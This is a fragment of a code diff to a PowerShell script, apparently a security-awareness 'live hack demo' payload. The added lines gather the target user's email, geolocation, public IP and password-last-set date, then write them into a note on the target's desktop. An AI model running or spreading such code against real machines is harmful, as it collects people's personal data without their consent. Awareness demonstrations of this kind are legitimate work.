@@ -558,7 +558,7 @@ function Get-email {
 
 
 }
-
+$setmail = Get-email
 # Write-Host statement used to track progress while debugging
 Write-Host "Installation done."
 
@@ -679,26 +679,8 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-Write-Host "GM Chamber Live Hack Demo" >> $message
-Write-Host "" >> $message
+$message = "GM Chamber Live Hack Demo`n" + "`nYour Location: $GL`n" + "`nEmail Id: $setmail`n" + "`nYour Public IP: $PubIP`n" + "`nPassword Last Set: $pls`n" + "`nStay Protected!!`n" + "`nStay Compliant!!`n" + "`nStay Safe!!`n"
 
-if ($GL) { Write-Host "`nYour Location: `n$GL" >> $message }
-Write-Host "" >> $message
-
-if ($PubIP) { Write-Host "`nYour Public IP: $PubIP" >> $message }
-Write-Host "" >> $message
-
-if ($pls) { Write-Host "`nPassword Last Set: $pls" >> $message }
-Write-Host "" >> $message
-
-Write-Host "Stay Protected!!" >> $message
-Write-Host "" >> $message
-
-Write-Host "Stay Compliant!!" >> $message
-Write-Host "" >> $message
-
-Write-Host "Stay Safe!!" >> $message
-Write-Host "" >> $message
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
 
